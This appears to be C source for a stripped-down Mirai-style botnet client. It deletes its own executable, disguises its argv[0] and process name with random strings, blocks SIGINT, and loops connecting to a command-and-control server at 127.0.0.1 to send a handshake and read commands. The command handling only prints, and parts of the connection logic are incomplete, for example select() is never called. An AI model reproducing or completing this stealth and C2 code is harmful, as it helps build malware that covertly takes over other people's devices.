
#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h> 
#include <sys/select.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>

#include "includes.h"
#include "rand.h"
#include "util.h"

static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1;
BOOL pending_connection = FALSE;

void (*resolve_func)(void) = (void (*)(void))resolve_cnc_addr; 

void util_memcpy(void *dst, void *src, int len) {
    char *r_dst = (char *)dst;
    char *r_src = (char *)src;
    while (len--)
        *r_dst++ = *r_src++;
}

int util_strcpy(char *dst, char *src) {
    int l = util_strlen(src);

    util_memcpy(dst, src, l + 1);

    return l;
}



int main(int argc, char **args) {
    char name_buf[32];
    char id_buf[32];
	int name_buf_len;


#ifndef DEBUG
    sigset_t sigs;
	int wfd;
	// Signal based control flow
    sigemptyset(&sigs);
    sigaddset(&sigs, SIGINT);
    sigprocmask(SIG_BLOCK, &sigs, NULL);

	signal(SIGCHLD, SIG_IGN);
#endif


 	rand_init();

    // Delete self
	unlink(args[0]);

    // Hide argv0
    name_buf_len = ((rand_next() % 4) + 3) * 4;
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    util_strcpy(args[0], name_buf);

    // Hide process name
    name_buf_len = ((rand_next() % 6) + 3) * 4;
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;

	prctl(PR_SET_NAME, name_buf);

#ifdef DEBUG  
    printf("[main] Welcom to debug mode \n");
#endif

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = INADDR_ANY;

 	while (TRUE) {
		fd_set fdsetrd, fdsetwr, fdsetex;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        if (fd_serv == -1)
            establish_connection();

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
			FD_SET(fd_serv, &fdsetrd);

		if(pending_connection) {

			pending_connection = FALSE;
            if (!FD_ISSET(fd_serv, &fdsetwr)) {
#ifdef DEBUG
   printf("[main] Timed out while connecting to CNC\n");
#endif
                teardown_connection();
           	} else { 

				uint8_t id_len = util_strlen(id_buf);

				send(fd_serv, "caca", 4, 0);
				send(fd_serv, &id_len, sizeof (id_len), MSG_NOSIGNAL);
           	}

		} else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd)) {
            int n;
            uint16_t len;
            char rdbuf[1024];

            errno = 0;
            n = recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1) {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }
            
            if (n == 0) {
#ifdef DEBUG
     printf("[main] Lost connection with CNC (errno = %d) 1\n", errno);
#endif
                teardown_connection();
                continue;
            }

            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);

#ifdef DEBUG
    printf("[main] Received %d bytes from CNC\n", len);
    printf("[main] Received command :  %s from CNC\n", rdbuf);
#endif
		}


		sleep(5);
	}


	return 0;
}

static void teardown_connection(void) {
#ifdef DEBUG
    printf("[main] Tearing down connection to CNC!\n");
#endif

    if (fd_serv != -1)
        close(fd_serv);
    fd_serv = -1;
    sleep(1);
}

static void resolve_cnc_addr(void) {
    srv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    srv_addr.sin_port = htons( SINGLE_INSTANCE_PORT );
}

static void establish_connection(void) {

#ifdef DEBUG
    printf("[main] Attempting to connect to CNC\n");
#endif

    if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[main] Failed to call socket(). Errno = %d\n", errno);
#endif
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    // Should call resolve_cnc_addr
    if (resolve_func != NULL)
        resolve_func();

    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
}